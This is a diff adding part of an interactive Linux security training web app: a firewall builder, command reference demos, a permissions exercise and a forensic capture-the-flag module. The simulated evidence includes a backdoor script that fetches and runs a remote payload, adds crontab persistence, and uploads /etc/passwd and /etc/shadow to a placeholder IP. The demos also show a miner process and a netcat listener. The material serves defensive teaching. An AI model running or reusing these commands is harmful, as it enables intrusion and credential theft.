+      <div>→ fail2ban automatically bans IPs after threshold</div>
+    </div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ═══ M6: FIREWALL BUILDER ═══ -->
+<div class="view" id="v-fw">
+<div class="vh"><div class="vh-tag">Module 06 — iptables</div><div class="vh-tt">Firewall Builder</div><div class="vh-sb">Configure iptables rules to secure the server. Block all unnecessary ports, allow only SSH (22) and HTTP (80), and drop everything else. Close unused ports to minimize attack surface.</div></div>
+
+<div class="mission"><div class="mission-title">⚠ ALL PORTS OPEN — CRITICAL RISK</div><div class="mission-body">The server's firewall shows no rules — policy ACCEPT on all ports. The attacker connected on port 4444 (backdoor) which should have been blocked. Build iptables rules to secure this server.</div></div>
+
+<div class="g2">
+<div>
+  <div class="terminal mb14">
+    <div class="term-bar"><div class="tbtn tbtn-r"></div><div class="tbtn tbtn-y"></div><div class="tbtn tbtn-g"></div><div class="term-title">firewall-config — iptables</div></div>
+    <div class="term-body" id="fw-term" style="min-height:260px"></div>
+    <div class="term-input-wrap">
+      <span class="tinput-prompt">root@server:~# </span>
+      <input class="tinput" id="fw-input" placeholder="sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT..." autocomplete="off" spellcheck="false" />
+    </div>
+  </div>
+  <div style="display:flex;gap:6px;flex-wrap:wrap;">
+    <button class="btn btn-g" onclick="fwCmd('sudo iptables -L')">iptables -L</button>
+    <button class="btn btn-a" onclick="fwCmd('sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT')">allow SSH</button>
+    <button class="btn btn-a" onclick="fwCmd('sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT')">allow HTTP</button>
+    <button class="btn btn-a" onclick="fwCmd('sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT')">allow HTTPS</button>
+    <button class="btn btn-r" onclick="fwCmd('sudo iptables -A INPUT -j DROP')">DROP all</button>
+    <button class="btn btn-g" onclick="fwCmd('sudo iptables -F')">flush rules</button>
+  </div>
+</div>
+<div>
+  <div class="card mb14">
+    <div class="ch">Active Firewall Rules</div>
+    <div class="cb" id="fw-rules">
+      <div style="font-size:10px;color:var(--mid)">// No rules configured — all ports open<br>// Chain INPUT (policy ACCEPT)</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="ch">Port Security Status</div>
+    <div class="cb" id="fw-ports">
+      <div class="obj-list">
+        <div class="obj-item" id="fwp-22">Port 22 (SSH) — not configured</div>
+        <div class="obj-item" id="fwp-80">Port 80 (HTTP) — not configured</div>
+        <div class="obj-item" id="fwp-443">Port 443 (HTTPS) — not configured</div>
+        <div class="obj-item" id="fwp-drop">Default DROP rule — not set</div>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ═══ M7: SECURITY HARDENING ═══ -->
+<div class="view" id="v-sec">
+<div class="vh"><div class="vh-tag">Module 07 — Security Measures</div><div class="vh-tt">Linux Security Hardening</div><div class="vh-sb">Walk through all 8 essential security measures from the IBM reading. Run each command simulation to see how to implement them and understand why each one matters.</div></div>
+
+<div class="status-bar">
+  <div class="sbi"><span class="td">HARDENING SCORE:</span> <span class="tg" id="sec-score">0 / 8</span></div>
+  <div class="sbi"><span class="td">STATUS:</span> <span id="sec-status" class="tr">VULNERABLE</span></div>
+  <div style="margin-left:auto"><button class="btn btn-g" onclick="resetSec()">↺ Reset</button></div>
+</div>
+
+<div id="sec-cards"></div>
+</div>
+
+<!-- ═══ M8: QUIZ ═══ -->
+<div class="view" id="v-qz">
+<div class="vh"><div class="vh-tag">Module 08 — Assessment</div><div class="vh-tt">Linux Security Quiz</div><div class="vh-sb">Test your knowledge from all three IBM readings: Linux Commands, Run Levels, and Securing Linux. 10 questions with instant feedback.</div></div>
+<div class="qbar" id="qbar"></div>
+<div id="qcon"></div>
+<div class="qsc" id="qsc"></div>
+</div>
+
+</div></div>
+
+<script>
+// ══ NAV ══
+function sv(id){document.querySelectorAll('.view').forEach(v=>v.classList.remove('on'));document.querySelectorAll('.nb').forEach(b=>b.classList.remove('on'));document.getElementById('v-'+id).classList.add('on');document.querySelectorAll('.nb').forEach(b=>{if(b.getAttribute('onclick')?.includes("'"+id+"'"))b.classList.add('on');});}
+
+// ══ TERMINAL HELPER ══
+function appendTermLine(termId,html,delay=0){
+  setTimeout(()=>{
+    const t=document.getElementById(termId);
+    const el=document.createElement('div');el.className='tl';el.innerHTML=html;
+    t.appendChild(el);t.scrollTop=t.scrollHeight;
+  },delay);
+}
+function clearTerm(termId){document.getElementById(termId).innerHTML='';}
+
+// ══ M1: COMMAND REFERENCE ══
+const CMDS=[
+  {cmd:'ls -la',cat:'Files',desc:'List ALL files including hidden dotfiles. Reveals permissions, owner, size, dates.',sec:'Attackers hide malware in hidden files (starting with ".")'},
+  {cmd:'pwd',cat:'Files',desc:'Print current working directory — shows your exact location in the filesystem.',sec:'Always know where you are before executing commands'},
+  {cmd:'cd <path>',cat:'Files',desc:'Change directory. Use Tab key to autocomplete directory names.',sec:'Use cd ../ to navigate to parent directories'},
+  {cmd:'mv',cat:'Files',desc:'Move or rename files and directories.',sec:'Track file movements to detect data exfiltration'},
+  {cmd:'cp',cat:'Files',desc:'Copy files or directories from one location to another.',sec:'Use for creating security backups before changes'},
+  {cmd:'rm',cat:'Files',desc:'Permanently delete files. No undo! Use with extreme caution.',sec:'Attackers use rm -rf to destroy evidence'},
+  {cmd:'chmod',cat:'Permissions',desc:'Change file permissions. Controls who can read, write, execute.',sec:'chmod 777 is DANGEROUS — world-writable files are exploitable'},
+  {cmd:'chown',cat:'Permissions',desc:'Change file or directory ownership to another user or group.',sec:'Unexpected ownership changes indicate compromise'},
+  {cmd:'sudo / su',cat:'Admin',desc:'Execute commands with elevated privileges (super user or switch user).',sec:'Principle of least privilege — only use sudo when necessary'},
+  {cmd:'apt-get',cat:'Packages',desc:'Manage software packages on Debian/Ubuntu systems.',sec:'sudo apt update && sudo apt upgrade patches vulnerabilities'},
+  {cmd:'ps aux',cat:'Processes',desc:'Display all running processes with CPU and memory usage.',sec:'High CPU processes may indicate cryptominers or malware'},
+  {cmd:'kill -9',cat:'Processes',desc:'Forcefully terminate a process by its PID.',sec:'Kill malicious processes immediately upon detection'},
+  {cmd:'grep',cat:'Search',desc:'Search for patterns in files using regular expressions.',sec:'Essential for log analysis and intrusion detection'},
+  {cmd:'find',cat:'Search',desc:'Traverse directory hierarchies to locate files matching criteria.',sec:'find / -name "*.sh" locates all shell scripts'},
+  {cmd:'ip',cat:'Network',desc:'Configure and troubleshoot network interfaces and routing.',sec:'Check for unexpected network connections'},
+  {cmd:'netstat -tlnp',cat:'Network',desc:'Display listening ports and the processes bound to them.',sec:'Identifies backdoors and unexpected open ports'},
+  {cmd:'df',cat:'System',desc:'Display disk usage across all mounted filesystems.',sec:'Sudden disk usage can indicate log tampering or data staging'},
+  {cmd:'dig',cat:'Network',desc:'Query DNS servers for domain records and diagnostics.',sec:'Use to detect DNS poisoning or suspicious lookups'},
+  {cmd:'cat',cat:'Text',desc:'Display file contents to the terminal (concatenate).',sec:'cat /etc/passwd reveals user accounts — review for anomalies'},
+  {cmd:'nano',cat:'Text',desc:'Lightweight terminal text editor for quick file editing.',sec:'Preferred for making quick config changes safely'},
+  {cmd:'tar',cat:'Archive',desc:'Create or extract compressed archives (.tar, .tar.gz).',sec:'Attackers use tar to bundle stolen files for exfiltration'},
+  {cmd:'rsync',cat:'Transfer',desc:'Synchronize files between local and remote systems efficiently.',sec:'Monitor rsync logs for unauthorized data transfers'},
+  {cmd:'iptables',cat:'Firewall',desc:'Configure kernel-level network packet filtering rules.',sec:'Block unused ports, drop unauthorized inbound connections'},
+  {cmd:'fail2ban',cat:'Security',desc:'Automatically ban IPs after repeated failed login attempts.',sec:'Stops brute-force SSH attacks automatically'},
+];
+const CMD_DEMOS = {
+  // File commands
+  'ls -la': [
+    ['td','// Listing with -la reveals hidden files'],
+    ['tprompt','root@server:~# ls -la /home'],
+    ['tw','total 56'],
+    ['tw','drwxr-xr-x 5 user user 4096 Feb 28 .'],
+    ['tw','drwxr-xr-x 3 root root 4096 Feb 28 ..'],
+    ['tw','-rw-r--r-- 1 user user  220 Feb 28 .bash_logout'],
+    ['tw','-rw-r--r-- 1 user user 3771 Feb 28 .bashrc'],
+    ['tw','-rw-r--r-- 1 user user  807 Feb 28 .profile'],
+    ['t-warn','-rw-rw-rw- 1 user user 1024 Feb 28 .secret_config'],
+    ['tg','-rwx------ 1 user user  2048 Feb 28 .hidden_key'],
+    ['td','// .secret_config is world-writable! .hidden_key is readable only by owner']
+  ],
+  'pwd': [
+    ['td','// Print working directory - shows current location'],
+    ['tprompt','root@server:~# pwd'],
+    ['tg','/root'],
+    ['tprompt','root@server:/var/log# pwd'],
+    ['tg','/var/log']
+  ],
+  'cd <path>': [
+    ['td','// Change directory - navigate the filesystem'],
+    ['tprompt','user@server:~$ pwd'],
+    ['tg','/home/user'],
+    ['tprompt','user@server:~$ cd /etc'],
+    ['tprompt','user@server:/etc$ pwd'],
+    ['tg','/etc'],
+    ['tprompt','user@server:/etc$ cd ~'],
+    ['tprompt','user@server:~$ pwd'],
+    ['tg','/home/user']
+  ],
+  'mv': [
+    ['td','// Move or rename files'],
+    ['tprompt','root@server:~# ls'],
+    ['tw','oldname.txt'],
+    ['tprompt','root@server:~# mv oldname.txt newname.txt'],
+    ['tprompt','root@server:~# ls'],
+    ['tg','newname.txt'],
+    ['td','// Attackers rename malicious files to blend in']
+  ],
+  'cp': [
+    ['td','// Copy files - create backups before changes'],
+    ['tprompt','root@server:~# cp /etc/passwd /root/passwd.backup'],
+    ['tprompt','root@server:~# ls -l /root/passwd.backup'],
+    ['tg','-rw-r--r-- 1 root root 2345 Feb 28 /root/passwd.backup'],
+    ['td','// Always backup config files before editing']
+  ],
+  'rm': [
+    ['td','// Remove files - NO UNDO! Use with extreme caution'],
+    ['tprompt','root@server:~# rm important.conf'],
+    ['tprompt','root@server:~# ls important.conf'],
+    ['tr','ls: cannot access important.conf: No such file or directory'],
+    ['t-threat','// Attackers use rm -rf to destroy evidence after compromise']
+  ],
+  
+  // Permission commands
+  'chmod': [
+    ['td','// chmod 777 is a critical security risk'],
+    ['tprompt','root@server:~# ls -l script.sh'],
+    ['tr','-rwxrwxrwx 1 root root 1024 script.sh ← WORLD WRITABLE'],
+    ['td','// Fixing with 755: owner executes, others only read'],
+    ['tprompt','root@server:~# chmod 755 script.sh'],
+    ['tprompt','root@server:~# ls -l script.sh'],
+    ['tg','-rwxr-xr-x 1 root root 1024 script.sh ← FIXED']
+  ],
+  'chown': [
+    ['td','// Change file ownership'],
+    ['tprompt','root@server:~# ls -l important.db'],
+    ['tw','-rw-r--r-- 1 root root 5120 important.db'],
+    ['tprompt','root@server:~# chown alice:developers important.db'],
+    ['tprompt','root@server:~# ls -l important.db'],
+    ['tg','-rw-r--r-- 1 alice developers 5120 important.db'],
+    ['td','// Unexpected ownership changes may indicate compromise']
+  ],
+  
+  // Admin commands
+  'sudo / su': [
+    ['td','// Execute commands with elevated privileges'],
+    ['tprompt','user@server:~$ whoami'],
+    ['tg','user'],
+    ['tprompt','user@server:~$ sudo whoami'],
+    ['tg','root'],
+    ['tprompt','user@server:~$ su -'],
+    ['ta','Password:'],
+    ['tprompt','root@server:~# whoami'],
+    ['tg','root'],
+    ['td','// Principle of least privilege - only use sudo when needed']
+  ],
+  'apt-get': [
+    ['td','// Package management - keep system updated'],
+    ['tprompt','root@server:~# sudo apt update'],
+    ['tw','Hit:1 http://security.ubuntu.com jammy-security InRelease'],
+    ['tw','Get:2 http://archive.ubuntu.com jammy-updates InRelease [119 kB]'],
+    ['tw','Reading package lists... Done'],
+    ['tprompt','root@server:~# sudo apt upgrade'],
+    ['tg','2 packages upgraded, 0 newly installed, 0 to remove'],
+    ['tg','openssl 3.0.2 → 3.0.12 (security update)'],
+    ['td','// Regular updates patch known vulnerabilities']
+  ],
+  
+  // Process commands
+  'ps aux': [
+    ['td','// Showing all running processes'],
+    ['tprompt','root@server:~# ps aux | head -5'],
+    ['tw','USER       PID %CPU %MEM COMMAND'],
+    ['tg','root         1  0.0  0.5 /sbin/init'],
+    ['tg','root       312  0.0  0.3 /usr/sbin/sshd -D'],
+    ['tg','www-data   890  0.1  1.2 nginx: worker process'],
+    ['t-threat','attacker  1337 99.0  2.5 /tmp/.miner --pool=evil:3333'],
+    ['t-threat','attacker  1338  0.1  0.2 nc -lvp 4444'],
+    ['td','// Malicious processes show unusual CPU and command paths']
+  ],
+  'kill -9': [
+    ['td','// Forcefully terminate processes by PID'],
+    ['tprompt','root@server:~# ps aux | grep miner'],
+    ['t-threat','attacker  1337 99.0 /tmp/.miner'],
+    ['tprompt','root@server:~# kill -9 1337'],
+    ['tg','// Process 1337 terminated'],
+    ['tprompt','root@server:~# ps aux | grep miner'],
+    ['td','// (no output - process killed)'],
+    ['td','// kill -9 sends SIGKILL - immediate termination']
+  ],
+  
+  // Search commands
+  'grep': [
+    ['td','// grep searches with regular expressions'],
+    ['tprompt','root@server:~# grep "Failed password" /var/log/auth.log | wc -l'],
+    ['tg','1547'],
+    ['t-threat','// 1547 failed login attempts!'],
+    ['tprompt','root@server:~# grep "Accepted" /var/log/auth.log'],
+    ['tr','Feb 28 03:47:22 sshd: Accepted password for root from 203.0.113.42']
+  ],
+  'find': [
+    ['td','// Find files matching criteria'],
+    ['tprompt','root@server:~# find / -name "*.sh" -type f 2>/dev/null'],
+    ['tw','/home/user/script.sh'],
+    ['tw','/usr/local/bin/backup.sh'],
+    ['t-threat','/tmp/.hidden/miner.sh'],
+    ['t-threat','/var/log/.backdoor.sh'],
+    ['t-threat','/etc/cron.d/update.sh'],
+    ['td','// Attackers hide scripts in unexpected locations']
+  ],
+  
+  // Network commands
+  'ip': [
+    ['td','// Network interface configuration and troubleshooting'],
+    ['tprompt','root@server:~# ip addr show'],
+    ['tw','1: lo: <LOOPBACK> mtu 65536'],
+    ['tw','    inet 127.0.0.1/8 scope host lo'],
+    ['tw','2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500'],
+    ['tw','    inet 192.168.1.100/24 brd 192.168.1.255 scope global eth0'],
+    ['tprompt','root@server:~# ip route show'],
+    ['tw','default via 192.168.1.1 dev eth0'],
+    ['td','// Check for unexpected network configurations']
+  ],
+  'netstat -tlnp': [
+    ['td','// Display listening ports and processes'],
+    ['tprompt','root@server:~# netstat -tlnp'],
+    ['tw','Proto Local Address   Foreign   PID/Program'],
+    ['tw','tcp   0.0.0.0:22     0.0.0.0:* 312/sshd'],
+    ['tw','tcp   0.0.0.0:80     0.0.0.0:* 890/nginx'],
+    ['tw','tcp   0.0.0.0:443    0.0.0.0:* 890/nginx'],
+    ['t-threat','tcp   0.0.0.0:4444   0.0.0.0:* 1338/nc'],
+    ['td','// Unexpected listening ports (4444) indicate backdoors']
+  ],
+  'dig': [
+    ['td','// DNS lookup utility'],
+    ['tprompt','root@server:~# dig example.com'],
+    ['tw','; ANSWER SECTION:'],
+    ['tw','example.com. 3600 IN A 93.184.216.34'],
+    ['tprompt','root@server:~# dig -x 93.184.216.34'],
+    ['tw','34.216.184.93.in-addr.arpa. 3600 IN PTR example.com.'],
+    ['td','// Use dig to verify DNS responses and detect poisoning']
+  ],
+  
+  // System commands
+  'df': [
+    ['td','// Disk usage across mounted filesystems'],
+    ['tprompt','root@server:~# df -h'],
+    ['tw','Filesystem      Size  Used Avail Use% Mounted on'],
+    ['tw','/dev/sda1        98G   45G   53G  46% /'],
+    ['tw','/dev/sdb1       500G  482G   18G  97% /var/log'],
+    ['t-warn','// Sudden disk usage spikes may indicate log tampering or data staging']
+  ],
+  
+  // Text commands
+  'cat': [
+    ['td','// Display file contents'],
+    ['tprompt','root@server:~# cat /etc/passwd | head -3'],
+    ['tw','root:x:0:0:root:/root:/bin/bash'],
+    ['tw','daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin'],
+    ['tw','bin:x:2:2:bin:/bin:/usr/sbin/nologin'],
+    ['td','// Review user accounts for anomalies'],
+    ['tprompt','root@server:~# cat /etc/shadow 2>&1 | head -1'],
+    ['tr','cat: /etc/shadow: Permission denied'],
+    ['td','// Shadow file should NOT be readable by regular users']
+  ],
+  'nano': [
+    ['td','// Terminal text editor'],
+    ['tprompt','root@server:~# nano /etc/ssh/sshd_config'],
+    ['tw','  GNU nano 6.2                 /etc/ssh/sshd_config'],
+    ['tw',''],
+    ['tw','#PermitRootLogin prohibit-password'],
+    ['tw','PermitRootLogin yes'],
+    ['tw','#PasswordAuthentication yes'],
+    ['tw','PasswordAuthentication yes'],
+    ['td','// Use Ctrl+O to save, Ctrl+X to exit'],
+    ['td','// nano is safer than vi for quick edits']
+  ],
+  
+  // Archive commands
+  'tar': [
+    ['td','// Create or extract archives'],
+    ['tprompt','root@server:~# tar czf backup.tgz /home/user'],
+    ['tprompt','root@server:~# ls -lh backup.tgz'],
+    ['tw','-rw-r--r-- 1 root root 4.2M Feb 28 backup.tgz'],
+    ['tprompt','root@server:~# tar tf backup.tgz | head -3'],
+    ['tw','home/user/'],
+    ['tw','home/user/.bashrc'],
+    ['tw','home/user/.profile'],
+    ['t-threat','// Attackers use tar to bundle stolen data for exfiltration']
+  ],
+  'rsync': [
+    ['td','// Efficient file synchronization'],
+    ['tprompt','root@server:~# rsync -av /etc /backup/'],
+    ['tw','sending incremental file list'],
+    ['tw','etc/'],
+    ['tw','etc/passwd'],
+    ['tw','etc/shadow'],
+    ['tw','sent 123,456 bytes  received 2,345 bytes  251,602.00 bytes/sec'],
+    ['td','// Monitor rsync logs for unauthorized data transfers']
+  ],
+  
+  // Firewall commands
+  'iptables': [
+    ['td','// Configure packet filtering rules'],
+    ['tprompt','root@server:~# iptables -L -n'],
+    ['tw','Chain INPUT (policy ACCEPT)'],
+    ['t-threat','// WARNING: policy ACCEPT = all ports open!'],
+    ['tprompt','root@server:~# iptables -A INPUT -p tcp --dport 22 -j ACCEPT'],
+    ['tprompt','root@server:~# iptables -A INPUT -p tcp --dport 80 -j ACCEPT'],
+    ['tprompt','root@server:~# iptables -A INPUT -j DROP'],
+    ['tprompt','root@server:~# iptables -L -n'],
+    ['tg','Chain INPUT (policy ACCEPT)'],
+    ['tg','ACCEPT     tcp  --  0.0.0.0/0    0.0.0.0/0    tcp dpt:22'],
+    ['tg','ACCEPT     tcp  --  0.0.0.0/0    0.0.0.0/0    tcp dpt:80'],
+    ['tg','DROP       all  --  0.0.0.0/0    0.0.0.0/0'],
+    ['td','// Server secured: only SSH and HTTP allowed']
+  ],
+  
+  // Security commands
+  'fail2ban': [
+    ['td','// Automatically ban brute-force IPs'],
+    ['tprompt','root@server:~# fail2ban-client status sshd'],
+    ['tw','Status for the jail: sshd'],
+    ['tw','|- Filter'],
+    ['tw','|  |- Currently failed: 0'],
+    ['tw','|  `- Total failed: 1547'],
+    ['tw','`- Actions'],
+    ['tw','   |- Currently banned: 1'],
+    ['tw','   `- Total banned: 1'],
+    ['tprompt','root@server:~# fail2ban-client set sshd banip 203.0.113.42'],
+    ['tg','1'],
+    ['td','// IP 203.0.113.42 banned from SSH access']
+  ],
+  
+  // Init command for run levels
+  'init': [
+    ['td','// Changing run levels with init command'],
+    ['tprompt','root@server:~# runlevel'],
+    ['tw','N 5'],
+    ['td','// Currently at run level 5 (GUI)'],
+    ['tprompt','root@server:~# init 1'],
+    ['ta','// Switching to single-user mode (maintenance)'],
+    ['tg','System entering run level 1: single-user'],
+    ['td','// All non-essential services stopping...'],
+    ['tprompt','root@server:~# init 5'],
+    ['tg','Returning to full multi-user GUI mode']
+  ]
+};
+
+function buildCmdGrid(){
+  const g=document.getElementById('cmd-grid');
+  const cats={};CMDS.forEach(c=>{if(!cats[c.cat])cats[c.cat]=[];cats[c.cat].push(c);});
+  Object.entries(cats).forEach(([cat,cmds])=>{
+    const hdr=document.createElement('div');hdr.style.cssText='font-size:8px;letter-spacing:2px;color:var(--amb);margin:8px 0 4px;';hdr.textContent='// '+cat.toUpperCase();
+    g.appendChild(hdr);
+    cmds.forEach(c=>{
+      const d=document.createElement('div');d.className='cmd-card';
+      d.innerHTML=`<div class="cmd-code">${c.cmd}</div><div class="cmd-desc">${c.desc}</div>${c.sec?`<div class="cmd-sec">⚠ ${c.sec}</div>`:''}`;
+      d.addEventListener('click',()=>demoCmd(c.cmd));
+      g.appendChild(d);
+    });
+  });
+}
+function demoCmd(cmd){
+  const t=document.getElementById('ref-term');t.innerHTML='';
+  
+  // Find matching demo - exact match or starts with
+  let key = null;
+  if (CMD_DEMOS[cmd]) {
+    key = cmd;
+  } else {
+    // Try matching by command name (first word)
+    const cmdName = cmd.split(' ')[0];
+    for (const k in CMD_DEMOS) {
+      if (k.startsWith(cmdName)) {
+        key = k;
+        break;
+      }
+    }
+  }
+  
+  if (!key) {
+    appendTermLine('ref-term',`<span class="td">// No demo available for: ${cmd}</span>`);
+    return;
+  }
+  
+  CMD_DEMOS[key].forEach((l,i)=>{
+    const cls=l[0]==='tprompt'?'tprompt':l[0];
+    let content = l[1];
+    
+    // Format prompt lines specially
+    if (l[0]==='tprompt') {
+      // Extract the command part after the prompt if present
+      const promptMatch = content.match(/^(root@server:~# |user@server:~# |user@server:~\$ |root@server:~# )?(.*)$/);
+      if (promptMatch && promptMatch[1]) {
+        // If the content already includes a prompt, use it as-is
+        appendTermLine('ref-term',`<span class="tprompt">${promptMatch[1]}</span><span class="tw">${promptMatch[2]}</span>`,i*160);
+      } else {
+        // Add standard prompt
+        appendTermLine('ref-term',`<span class="tprompt">root@server:~# </span><span class="tw">${content}</span>`,i*160);
+      }
+    } else {
+      appendTermLine('ref-term',`<span class="${cls}">${content}</span>`,i*160);
+    }
+  });
+  
+  // Add cursor at the end
+  appendTermLine('ref-term',`<span class="tprompt">root@server:~# </span><span class="tblink">█</span>`,CMD_DEMOS[key].length*160 + 200);
+}
+
+// ══ M2: FILE SYSTEM ══
+let fsDir='/home/investigator',fsFlags=0,fsHistory=[];
+const FS={
+  '/home/investigator':{
+    type:'dir',
+    ls:[
+      'total 48',
+      'drwxr-xr-x 4 investigator investigator 4096 Feb 28 08:00 .',
+      'drwxr-xr-x 3 root root 4096 Feb 28 08:00 ..',
+      '-rw-r--r-- 1 investigator investigator  892 Feb 28 08:00 README.txt',
+      '-rw-r--r-- 1 investigator investigator  220 Feb 28 08:00 .bash_profile',
+      'drwxr-xr-x 2 investigator investigator 4096 Feb 28 08:00 .ssh',
+    ],
+    'README.txt':'FORENSIC INVESTIGATION BRIEF\n\nA server was compromised on Feb 28 at 03:15 AM.\nThe attacker gained access via SSH brute force.\nTraces were found in /var/log/private/\nInvestigate and document all findings.\n\nFLAG{investigation_started_01}',
+  },
+  '/var/log':{
+    type:'dir',
+    ls:[
+      'total 284K',
+      'drwxr-xr-x 8 root root 4.0K Feb 28 14:23 .',
+      'drwxr-xr-x 14 root root 4.0K Feb 28 14:20 ..',
+      '-rw-r--r-- 1 root root 2.3M Feb 28 14:30 auth.log',
+      '-rw-r--r-- 1 root root 1.1M Feb 28 14:30 syslog',
+      'drwx------ 2 root root 4.0K Feb 28 14:22 private/',
+    ],
+  },
+  '/var/log/private':{
+    type:'dir',
+    ls:[
+      'total 8K',
+      '-rwxr-xr-x 1 www-data www-data 2.1K Feb 28 03:15 .shell.sh',
+      '-rw-r--r-- 1 www-data www-data 512 Feb 28 03:15 .cache',
+    ],
+    '.shell.sh':'#!/bin/bash\n# Backdoor persistence script\n# FLAG{attacker_backdoor_found_02}\ncurl -s http://203.0.113.42/payload | bash\necho "*/5 * * * * /var/log/private/.shell.sh" >> /etc/crontab\n# Exfiltrate data\ntar czf /tmp/.data.tgz /etc/passwd /etc/shadow 2>/dev/null\ncurl -F "file=@/tmp/.data.tgz" http://203.0.113.42/upload',
+  }
+};
+function fsPrompt(){return `<span class="tprompt">investigator@forensic-server:${fsDir}$</span> `;}
+function checkFsFlag(content){
+  const flags=content.match(/FLAG\{[^}]+\}/g)||[];
+  flags.forEach(f=>{
+    if(!fsHistory.includes(f)){fsHistory.push(f);fsFlags++;document.getElementById('fs-flags').textContent=`${fsFlags} / 3`;}
+  });
+}
+function fsCmd(cmd){
+  document.getElementById('fs-input').value='';
+  const t=document.getElementById('fs-term');
+  const addLine=(html,delay=0)=>{setTimeout(()=>{const el=document.createElement('div');el.className='tl';el.innerHTML=html;t.appendChild(el);t.scrollTop=t.scrollHeight;},delay);}
+  addLine(`${fsPrompt()}<span class="tw">${cmd}</span>`);
+  const c=cmd.trim();
+  if(c==='ls -la'||c==='ls -l'||c==='ls'){
+    const dir=FS[fsDir];
+    if(dir&&dir.ls){dir.ls.forEach((l,i)=>addLine(`<span class="${l.includes('private')||l.includes('.shell')||l.includes('.cache')?'t-warn':'td'}">${l}</span>`,i*60));}
+    else addLine(`<span class="tr">ls: cannot access: No such file or directory</span>`);
+    document.getElementById('obj-ls').classList.add('done');
+    if(fsDir==='/var/log')setTimeout(()=>addLine(`<span class="t-warn">⚠ [SUSPICIOUS] Private directory owned by www-data in /var/log</span>`),700);
+    if(fsDir==='/var/log/private'){document.getElementById('obj-priv').classList.add('done');setTimeout(()=>addLine(`<span class="tr">⚠ THREAT DETECTED: Hidden executable script (.shell.sh) found!</span>`),700);}
+  } else if(c==='pwd'){
+    addLine(`<span class="tg">${fsDir}</span>`);
+  } else if(c.startsWith('cd ')){
+    const target=c.replace('cd ','').trim();
+    const abs=target.startsWith('/')?target:fsDir+'/'+target;
+    const resolved=abs.replace(/\/\//g,'/');
+    if(FS[resolved]){fsDir=resolved;document.getElementById('fs-pwd').textContent=fsDir;addLine(`<span class="tg">// Changed to ${fsDir}</span>`);if(fsDir==='/var/log')document.getElementById('obj-nav').classList.add('done');}
+    else addLine(`<span class="tr">bash: cd: ${target}: Permission denied</span>`);
+  } else if(c.startsWith('cat ')||c.startsWith('sudo cat ')){
+    const path=c.replace('sudo ','').replace('cat ','').trim();
+    const fullPath=path.startsWith('/')?path:fsDir+'/'+path.replace('./','/');
+    const searchPaths=[fullPath,'/home/investigator/'+path,'/var/log/private/'+path];
+    let found=false;
+    for(const sp of searchPaths){
+      const parts=sp.split('/');const fn=parts.pop();const dir=parts.join('/')||'/';
+      if(FS[dir]&&FS[dir][fn]){
+        const content=FS[dir][fn];content.split('\n').forEach((l,i)=>addLine(`<span class="${l.startsWith('#')?'td':l.includes('FLAG')?'tgrn':l.includes('curl')||l.includes('bash')?'tr':'tg'}">${l}</span>`,i*40));
+        checkFsFlag(content);
+        if(fn==='.shell.sh')document.getElementById('obj-shell').classList.add('done');
+        if(fn==='README.txt')addLine(`<span class="tgrn">🚩 FLAG CAPTURED!</span>`,500);
+        found=true;break;
+      }
+    }
+    if(!found)addLine(`<span class="tr">cat: ${path}: No such file or directory</span>`);
+  } else if(c.startsWith('sudo ls')){
+    if(c.includes('private')){
+      const dir=FS['/var/log/private'];dir.ls.forEach((l,i)=>addLine(`<span class="${l.includes('.shell')?'tr':'td'}">${l}</span>`,i*80));
+      document.getElementById('obj-priv').classList.add('done');
+      setTimeout(()=>addLine(`<span class="tr">⚠ THREAT: Hidden executable owned by www-data!</span>`),700);
+    } else addLine(`<span class="td">total 0</span>`);
+  } else if(c.startsWith('find')){
+    addLine(`<span class="td">// Searching filesystem for .sh files...</span>`);
+    setTimeout(()=>addLine(`<span class="ta">/var/log/private/.shell.sh</span>`),300);
+    setTimeout(()=>addLine(`<span class="ta">/tmp/.miner.sh</span>`),500);
+    setTimeout(()=>addLine(`<span class="ta">/etc/cron.d/update.sh</span>`),700);
+    setTimeout(()=>{addLine(`<span class="tr">⚠ CRITICAL: 3 suspicious shell scripts found!</span>`);document.getElementById('obj-find').classList.add('done');},900);
+    checkFsFlag('FLAG{find_all_scripts_03}');
+  } else {
+    addLine(`<span class="tr">bash: ${c.split(' ')[0]}: command not found</span>`);
+  }
+  if(fsFlags>=3)document.getElementById('obj-flag').classList.add('done');
+}
+document.addEventListener('DOMContentLoaded',()=>{
+  fsCmd('ls -la');
+  document.getElementById('fs-input').addEventListener('keydown',e=>{if(e.key==='Enter'){fsCmd(e.target.value);e.target.value='';}});
+});
+function resetFS(){
+  fsDir='/home/investigator';fsFlags=0;fsHistory=[];
+  document.getElementById('fs-pwd').textContent='/home/investigator';
+  document.getElementById('fs-flags').textContent='0 / 3';
+  document.getElementById('fs-term').innerHTML='';
+  ['obj-ls','obj-nav','obj-priv','obj-shell','obj-find','obj-flag'].forEach(id=>document.getElementById(id).classList.remove('done'));
+  fsCmd('ls -la');
+}
+
+// ══ M3: PERMISSIONS ══
+const PERM_FILES={
+  'deploy.sh':{current:'777',correct:'755',desc:'Deployment script'},
+  'config.env':{current:'666',correct:'640',desc:'Environment config with secrets'},
+  'index.html':{current:'777',correct:'644',desc:'Web page'},
+  '.ssh/id_rsa':{current:'644',correct:'600',desc:'SSH private key'},
+};
+let permFixed={};
+function permCmd(cmd){
+  document.getElementById('perm-input').value='';
+  const t=document.getElementById('perm-term');
+  const addL=(html,d=0)=>{setTimeout(()=>{const el=document.createElement('div');el.className='tl';el.innerHTML=html;t.appendChild(el);t.scrollTop=t.scrollHeight;},d);}
+  addL(`<span class="tprompt">user@server:~$ </span><span class="tw">${cmd}</span>`);
+  const c=cmd.trim();
+  if(c==='ls -l'||c==='ls -la'){
+    addL(`<span class="td">total 36</span>`);
+    Object.entries(PERM_FILES).forEach(([name,f],i)=>{
+      const fixed=permFixed[name];
+      const perm=fixed?f.correct:f.current;
+      const isRisk=!fixed&&(f.current==='777'||f.current==='666'||f.current==='644');
+      const str=perm==='777'?'-rwxrwxrwx':perm==='666'?'-rw-rw-rw-':perm==='755'?'-rwxr-xr-x':perm==='644'?'-rw-r--r--':perm==='640'?'-rw-r-----':'-rw-------';
